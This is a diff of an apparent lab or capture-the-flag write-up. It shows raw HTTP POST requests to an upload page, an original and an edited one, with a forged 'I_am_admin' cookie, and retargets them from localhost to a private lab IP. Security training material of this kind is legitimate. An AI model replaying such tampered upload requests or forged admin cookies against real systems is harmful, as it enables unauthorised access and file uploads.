@@ -9,12 +9,12 @@ So Easy !
 Original request:
 
 POST /index.php?page=upload HTTP/1.1
-Host: localhost:8042
+Host: 192.168.56.103
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
-Referer: http://localhost:8042/index.php?page=upload
+Referer: http://192.168.56.103/index.php?page=upload
 Content-Type: multipart/form-data; boundary=---------------------------120521787015560711891731003545
 Content-Length: 1579
 Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
@@ -43,12 +43,12 @@ Upload
 Edited Request:
 
 POST /index.php?page=upload HTTP/1.1
-Host: localhost:8042
+Host: 192.168.56.103
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
-Referer: http://localhost:8042/index.php?page=upload
+Referer: http://192.168.56.103/index.php?page=upload
 Content-Type: multipart/form-data; boundary=---------------------------120521787015560711891731003545
 Content-Length: 1575
 Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
